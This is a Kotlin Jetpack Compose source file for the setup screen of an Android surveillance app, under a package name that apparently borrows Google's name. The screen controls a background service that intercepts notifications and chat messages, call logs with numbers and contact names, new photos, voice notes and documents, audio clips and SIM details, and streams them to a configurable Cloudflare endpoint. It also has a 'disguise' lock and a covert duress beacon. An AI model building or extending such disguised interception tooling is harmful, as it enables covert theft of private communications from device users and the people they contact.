package com.opp.googleoperation.ui.screens

import android.content.Context
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.BatteryChargingFull
import androidx.compose.material.icons.filled.Call
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.CloudUpload
import androidx.compose.material.icons.filled.Folder
import androidx.compose.material.icons.filled.Notifications
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.SimCard
import androidx.compose.material.icons.filled.Speed
import androidx.compose.material.icons.filled.Stop
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Surface
import androidx.compose.material3.Switch
import androidx.compose.material3.SwitchDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.compose.LocalLifecycleOwner
import com.opp.googleoperation.service.TelemetryService
import com.opp.googleoperation.util.Constants
import com.opp.googleoperation.util.PermissionHelper

@Composable
fun ProvisioningScreen(
    onLockDisguise: () -> Unit = {},
    modifier: Modifier = Modifier
) {
    val ctx = LocalContext.current
    val lifecycleOwner = LocalLifecycleOwner.current
    val isServiceRunning by TelemetryService.isRunning.collectAsState()
    val latestTelemetry by TelemetryService.latestTelemetry.collectAsState()
    val latestNotification by TelemetryService.latestNotification.collectAsState()
    val latestMediaEvent by TelemetryService.latestMediaEvent.collectAsState()
    val latestAudioThreat by TelemetryService.latestAudioThreat.collectAsState()
    val latestCallEvent by TelemetryService.latestCallEvent.collectAsState()
    val isDuressActive by TelemetryService.isDuressActive.collectAsState()

    val prefs = remember { ctx.getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE) }
    val deviceId = remember { PermissionHelper.getOrCreateDeviceId(ctx) }

    var serverUrl by remember {
        mutableStateOf(prefs.getString(Constants.KEY_SERVER_URL, Constants.DEFAULT_WORKER_URL) ?: Constants.DEFAULT_WORKER_URL)
    }

    // Permission states
    var hasUsageAccess by remember { mutableStateOf(PermissionHelper.hasUsageStatsPermission(ctx)) }
    var hasNotificationAccess by remember { mutableStateOf(PermissionHelper.hasNotificationAccess(ctx)) }
    var isIgnoringBattery by remember { mutableStateOf(PermissionHelper.isIgnoringBatteryOptimizations(ctx)) }
    var hasMediaAccess by remember { mutableStateOf(PermissionHelper.hasMediaPermissions(ctx)) }
    var hasPhoneState by remember { mutableStateOf(PermissionHelper.hasPhoneStatePermission(ctx)) }
    var hasCallLog by remember { mutableStateOf(PermissionHelper.hasCallLogPermission(ctx)) }
    var hasPostNotification by remember { mutableStateOf(PermissionHelper.hasPostNotificationsPermission(ctx)) }

    fun refreshPermissions() {
        hasUsageAccess = PermissionHelper.hasUsageStatsPermission(ctx)
        hasNotificationAccess = PermissionHelper.hasNotificationAccess(ctx)
        isIgnoringBattery = PermissionHelper.isIgnoringBatteryOptimizations(ctx)
        hasMediaAccess = PermissionHelper.hasMediaPermissions(ctx)
        hasPhoneState = PermissionHelper.hasPhoneStatePermission(ctx)
        hasCallLog = PermissionHelper.hasCallLogPermission(ctx)
        hasPostNotification = PermissionHelper.hasPostNotificationsPermission(ctx)
    }

    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                refreshPermissions()
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    val runtimePermissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) {
        refreshPermissions()
    }

    val allPermissionsGranted = hasUsageAccess && hasNotificationAccess &&
            isIgnoringBattery && hasMediaAccess && hasPhoneState && hasCallLog && hasPostNotification

    LazyColumn(
        modifier = modifier
            .fillMaxSize()
            .background(Color(0xFF0F172A))
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        // Header
        item {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Column {
                    Text(
                        text = "TACTICAL TELEMETRY",
                        color = Color(0xFF38BDF8),
                        fontSize = 12.sp,
                        fontWeight = FontWeight.Bold,
                        letterSpacing = 1.5.sp
                    )
                    Text(
                        text = "Device Provisioning",
                        color = Color.White,
                        fontSize = 22.sp,
                        fontWeight = FontWeight.ExtraBold
                    )
                }

                Row(verticalAlignment = Alignment.CenterVertically) {
                    OutlinedButton(
                        onClick = onLockDisguise,
                        shape = RoundedCornerShape(8.dp),
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFF94A3B8)),
                        modifier = Modifier.height(34.dp)
                    ) {
                        Text("Lock", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                    }

                    Spacer(modifier = Modifier.width(8.dp))

                    Surface(
                        shape = RoundedCornerShape(8.dp),
                        color = Color(0xFF1E293B)
                    ) {
                        Row(
                            modifier = Modifier.padding(horizontal = 10.dp, vertical = 6.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Box(
                                modifier = Modifier
                                    .size(8.dp)
                                    .clip(CircleShape)
                                    .background(if (isServiceRunning) Color(0xFF22C55E) else Color(0xFFEF4444))
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(
                                text = if (isServiceRunning) "ACTIVE" else "IDLE",
                                color = if (isServiceRunning) Color(0xFF22C55E) else Color(0xFFEF4444),
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Bold
                            )
                        }
                    }
                }
            }
        }

        // Active Duress Alert Banner
        if (isDuressActive) {
            item {
                Surface(
                    shape = RoundedCornerShape(10.dp),
                    color = Color(0xFF7F1D1D),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Row(
                        modifier = Modifier.padding(14.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(Icons.Default.Warning, contentDescription = null, tint = Color(0xFFEF4444))
                        Spacer(modifier = Modifier.width(10.dp))
                        Column {
                            Text(
                                text = "RED DURESS BEACON ACTIVE",
                                color = Color.White,
                                fontSize = 13.sp,
                                fontWeight = FontWeight.Bold
                            )
                            Text(
                                text = "Covert distress signal sent. Silent audio snapshot buffered.",
                                color = Color(0xFFFECACA),
                                fontSize = 11.sp
                            )
                        }
                    }
                }
            }
        }

        // Operative & Device Identity Card
        item {
            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B)),
                shape = RoundedCornerShape(12.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text(
                        text = "ASSIGNED DEVICE ID",
                        color = Color(0xFF94A3B8),
                        fontSize = 11.sp,
                        fontWeight = FontWeight.SemiBold
                    )
                    Spacer(modifier = Modifier.height(4.dp))
                    Text(
                        text = deviceId,
                        color = Color(0xFF38BDF8),
                        fontSize = 20.sp,
                        fontFamily = FontFamily.Monospace,
                        fontWeight = FontWeight.Bold
                    )
                    Spacer(modifier = Modifier.height(12.dp))
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(
                            text = "Background Telemetry Service",
                            color = Color.White,
                            fontSize = 14.sp,
                            fontWeight = FontWeight.Medium
                        )
                        Switch(
                            checked = isServiceRunning,
                            onCheckedChange = { checked ->
                                if (checked) {
                                    TelemetryService.start(ctx)
                                } else {
                                    TelemetryService.stop(ctx)
                                }
                            },
                            colors = SwitchDefaults.colors(
                                checkedThumbColor = Color.White,
                                checkedTrackColor = Color(0xFF0284C7)
                            )
                        )
                    }
                }
            }
        }

        // Cloudflare Endpoint Card
        item {
            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B)),
                shape = RoundedCornerShape(12.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text(
                        text = "CLOUDFLARE INGESTION ENDPOINT",
                        color = Color(0xFF94A3B8),
                        fontSize = 11.sp,
                        fontWeight = FontWeight.SemiBold
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    OutlinedTextField(
                        value = serverUrl,
                        onValueChange = {
                            serverUrl = it
                            prefs.edit().putString(Constants.KEY_SERVER_URL, it).apply()
                        },
                        modifier = Modifier.fillMaxWidth(),
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedBorderColor = Color(0xFF38BDF8),
                            unfocusedBorderColor = Color(0xFF334155),
                            focusedTextColor = Color.White,
                            unfocusedTextColor = Color.White
                        ),
                        singleLine = true,
                        shape = RoundedCornerShape(8.dp)
                    )
                }
            }
        }

        // Live Telemetry Diagnostics Card
        item {
            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B)),
                shape = RoundedCornerShape(12.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(
                            text = "LIVE TELEMETRY DIAGNOSTICS",
                            color = Color(0xFF94A3B8),
                            fontSize = 11.sp,
                            fontWeight = FontWeight.SemiBold
                        )
                        Text(
                            text = if (latestTelemetry != null) "STREAMING" else "WAITING FOR SERVICE",
                            color = if (latestTelemetry != null) Color(0xFF38BDF8) else Color(0xFF64748B),
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        // Battery Pill
                        Surface(
                            shape = RoundedCornerShape(8.dp),
                            color = Color(0xFF0F172A),
                            modifier = Modifier.weight(1f)
                        ) {
                            Column(modifier = Modifier.padding(10.dp)) {
                                Text("BATTERY", color = Color(0xFF64748B), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                Spacer(modifier = Modifier.height(2.dp))
                                val battPct = latestTelemetry?.battery?.level ?: -1
                                val charging = latestTelemetry?.battery?.isCharging == true
                                Text(
                                    text = if (battPct >= 0) "$battPct% ${if (charging) "(⚡)" else ""}" else "--",
                                    color = Color.White,
                                    fontSize = 14.sp,
                                    fontWeight = FontWeight.Bold
                                )
                            }
                        }

                        // Network Pill
                        Surface(
                            shape = RoundedCornerShape(8.dp),
                            color = Color(0xFF0F172A),
                            modifier = Modifier.weight(1f)
                        ) {
                            Column(modifier = Modifier.padding(10.dp)) {
                                Text("NETWORK", color = Color(0xFF64748B), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                Spacer(modifier = Modifier.height(2.dp))
                                Text(
                                    text = latestTelemetry?.network?.networkType ?: "--",
                                    color = Color(0xFF38BDF8),
                                    fontSize = 14.sp,
                                    fontWeight = FontWeight.Bold
                                )
                            }
                        }
                    }

                    Spacer(modifier = Modifier.height(8.dp))

                    // Active App Pill
                    Surface(
                        shape = RoundedCornerShape(8.dp),
                        color = Color(0xFF0F172A),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Column(modifier = Modifier.padding(10.dp)) {
                            Text("CURRENT ACTIVE APP", color = Color(0xFF64748B), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                            Spacer(modifier = Modifier.height(2.dp))
                            Text(
                                text = latestTelemetry?.activeApp ?: "Unknown / Pending",
                                color = Color(0xFF4ADE80),
                                fontSize = 13.sp,
                                fontWeight = FontWeight.SemiBold
                            )
                        }
                    }

                    // SIM Info row if available
                    val sims = latestTelemetry?.sims
                    if (!sims.isNullOrEmpty()) {
                        Spacer(modifier = Modifier.height(8.dp))
                        Surface(
                            shape = RoundedCornerShape(8.dp),
                            color = Color(0xFF0F172A),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(10.dp)) {
                                Text("DETECTED SIM CARRIERS", color = Color(0xFF64748B), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                Spacer(modifier = Modifier.height(2.dp))
                                val carriers = sims.joinToString(", ") { "Slot ${it.slotIndex + 1}: ${it.carrierName}" }
                                Text(
                                    text = carriers,
                                    color = Color.White,
                                    fontSize = 12.sp,
                                    fontWeight = FontWeight.Medium
                                )
                            }
                        }
                    }

                    // Latest Intercepted Notification
                    if (latestNotification != null) {
                        Spacer(modifier = Modifier.height(8.dp))
                        Surface(
                            shape = RoundedCornerShape(8.dp),
                            color = Color(0xFF0F172A),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(10.dp)) {
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.SpaceBetween
                                ) {
                                    Text("LATEST NOTIFICATION", color = Color(0xFF38BDF8), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                    Text(latestNotification!!.appName, color = Color(0xFF94A3B8), fontSize = 10.sp)
                                }
                                Spacer(modifier = Modifier.height(2.dp))
                                Text(
                                    text = "${latestNotification!!.title}: ${latestNotification!!.content}",
                                    color = Color.White,
                                    fontSize = 12.sp,
                                    maxLines = 2
                                )
                            }
                        }
                    }

                    // Latest Intercepted Media
                    if (latestMediaEvent != null) {
                        Spacer(modifier = Modifier.height(8.dp))
                        Surface(
                            shape = RoundedCornerShape(8.dp),
                            color = Color(0xFF0F172A),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(10.dp)) {
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.SpaceBetween
                                ) {
                                    Text("NEW MEDIA DETECTED", color = Color(0xFFF59E0B), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                    Text(latestMediaEvent!!.mediaType.uppercase(), color = Color(0xFF94A3B8), fontSize = 10.sp)
                                }
                                Spacer(modifier = Modifier.height(2.dp))
                                Text(
                                    text = "${latestMediaEvent!!.fileName} (${latestMediaEvent!!.sizeBytes / 1024} KB)",
                                    color = Color.White,
                                    fontSize = 12.sp
                                )
                            }
                        }
                    }

                    // Latest Edge-AI Audio Threat Snapshot
                    if (latestAudioThreat != null) {
                        Spacer(modifier = Modifier.height(8.dp))
                        Surface(
                            shape = RoundedCornerShape(8.dp),
                            color = Color(0xFF0F172A),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(10.dp)) {
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.SpaceBetween
                                ) {
                                    Text("VOICE ACTIVITY DETECTED", color = Color(0xFF10B981), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                    Text(latestAudioThreat!!.threatType, color = Color(0xFF6EE7B7), fontSize = 10.sp)
                                }
                                Spacer(modifier = Modifier.height(2.dp))
                                Text(
                                    text = "${latestAudioThreat!!.durationSec}s Opus Clip (${latestAudioThreat!!.fileSizeBytes / 1024} KB) - Score: ${String.format("%.2f", latestAudioThreat!!.confidenceScore)}",
                                    color = Color.White,
                                    fontSize = 12.sp
                                )
                            }
                        }
                    }

                    // Latest Intercepted Call Log / Live State
                    if (latestCallEvent != null) {
                        Spacer(modifier = Modifier.height(8.dp))
                        Surface(
                            shape = RoundedCornerShape(8.dp),
                            color = Color(0xFF0F172A),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(10.dp)) {
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.SpaceBetween
                                ) {
                                    Text("CALL EVENT INTERCEPTED", color = Color(0xFF818CF8), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                    Text("${latestCallEvent!!.callType} (SIM ${latestCallEvent!!.simSlot})", color = Color(0xFFA5B4FC), fontSize = 10.sp)
                                }
                                Spacer(modifier = Modifier.height(2.dp))
                                Text(
                                    text = "${latestCallEvent!!.phoneNumber}${if (!latestCallEvent!!.contactName.isNullOrEmpty()) " (${latestCallEvent!!.contactName})" else ""} - ${latestCallEvent!!.durationSeconds}s",
                                    color = Color.White,
                                    fontSize = 12.sp
                                )
                            }
                        }
                    }
                }
            }
        }

        // Permission Checklist Section
        item {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(
                    text = "SECURITY ACCESS CHECKLIST",
                    color = Color(0xFF94A3B8),
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold,
                    letterSpacing = 1.sp
                )
                if (allPermissionsGranted) {
                    Text(
                        text = "ALL GRANTED",
                        color = Color(0xFF22C55E),
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
            }
        }

        // 1. Notification Listener Access
        item {
            PermissionCard(
                title = "Notification Listener Access",
                description = "Captures incoming push notifications, chat messages, and tactical alerts",
                icon = Icons.Default.Notifications,
                isGranted = hasNotificationAccess,
                onGrantClick = { PermissionHelper.openNotificationAccessSettings(ctx) }
            )
        }

        // 2. Usage Stats Access
        item {
            PermissionCard(
                title = "App Usage Stats Access",
                description = "Monitors foreground application switches and screen-time telemetry",
                icon = Icons.Default.Speed,
                isGranted = hasUsageAccess,
                onGrantClick = { PermissionHelper.openUsageStatsSettings(ctx) }
            )
        }

        // 3. Battery Optimization Exemption
        item {
            PermissionCard(
                title = "Battery Optimization Ignore",
                description = "Prevents OS from killing background telemetry during Doze mode",
                icon = Icons.Default.BatteryChargingFull,
                isGranted = isIgnoringBattery,
                onGrantClick = { PermissionHelper.requestIgnoreBatteryOptimizations(ctx) }
            )
        }

        // 4. Media & Storage Access
        item {
            PermissionCard(
                title = "Media & Documents (Photos/Audio/PDF)",
                description = "Detects newly stored voice notes, photos, videos, and PDF intelligence",
                icon = Icons.Default.Folder,
                isGranted = hasMediaAccess,
                onGrantClick = {
                    runtimePermissionLauncher.launch(PermissionHelper.getRequiredRuntimePermissions())
                }
            )
        }

        // 5. Phone State & SIM Access
        item {
            PermissionCard(
                title = "SIM & Cellular Network Access",
                description = "Reads active SIM carriers, slot count, signal and 5G network type",
                icon = Icons.Default.SimCard,
                isGranted = hasPhoneState,
                onGrantClick = {
                    runtimePermissionLauncher.launch(PermissionHelper.getRequiredRuntimePermissions())
                }
            )
        }

        // 6. Call Log Access
        item {
            PermissionCard(
                title = "Call Log & Telephony Interception",
                description = "Intercepts incoming/outgoing calls, duration, and dual-SIM call history",
                icon = Icons.Default.Call,
                isGranted = hasCallLog,
                onGrantClick = {
                    runtimePermissionLauncher.launch(PermissionHelper.getRequiredRuntimePermissions())
                }
            )
        }

        // Quick Action Button
        item {
            Spacer(modifier = Modifier.height(8.dp))
            Button(
                onClick = {
                    runtimePermissionLauncher.launch(PermissionHelper.getRequiredRuntimePermissions())
                },
                modifier = Modifier
                    .fillMaxWidth()
                    .height(48.dp),
                shape = RoundedCornerShape(8.dp),
                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF0284C7))
            ) {
                Icon(Icons.Default.Security, contentDescription = null, modifier = Modifier.size(18.dp))
                Spacer(modifier = Modifier.width(8.dp))
                Text(
                    text = "Request All Standard Permissions",
                    fontWeight = FontWeight.Bold,
                    fontSize = 14.sp
                )
            }
        }
    }
}

@Composable
private fun PermissionCard(
    title: String,
    description: String,
    icon: ImageVector,
    isGranted: Boolean,
    onGrantClick: () -> Unit
) {
    Card(
        colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B)),
        shape = RoundedCornerShape(10.dp),
        modifier = Modifier.fillMaxWidth()
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(14.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Box(
                modifier = Modifier
                    .size(40.dp)
                    .clip(RoundedCornerShape(8.dp))
                    .background(if (isGranted) Color(0xFF14532D) else Color(0xFF334155)),
                contentAlignment = Alignment.Center
            ) {
                Icon(
                    imageVector = icon,
                    contentDescription = null,
                    tint = if (isGranted) Color(0xFF4ADE80) else Color(0xFF94A3B8),
                    modifier = Modifier.size(20.dp)
                )
            }

            Spacer(modifier = Modifier.width(12.dp))

            Column(modifier = Modifier.weight(1f)) {
                Text(
                    text = title,
                    color = Color.White,
                    fontSize = 14.sp,
                    fontWeight = FontWeight.Bold
                )
                Text(
                    text = description,
                    color = Color(0xFF94A3B8),
                    fontSize = 11.sp,
                    lineHeight = 14.sp
                )
            }

            Spacer(modifier = Modifier.width(8.dp))

            if (isGranted) {
                Icon(
                    imageVector = Icons.Default.CheckCircle,
                    contentDescription = "Granted",
                    tint = Color(0xFF22C55E),
                    modifier = Modifier.size(24.dp)
                )
            } else {
                OutlinedButton(
                    onClick = onGrantClick,
                    shape = RoundedCornerShape(6.dp),
                    colors = ButtonDefaults.outlinedButtonColors(
                        contentColor = Color(0xFF38BDF8)
                    ),
                    modifier = Modifier.height(34.dp)
                ) {
                    Text("Grant", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                }
            }
        }
    }
}
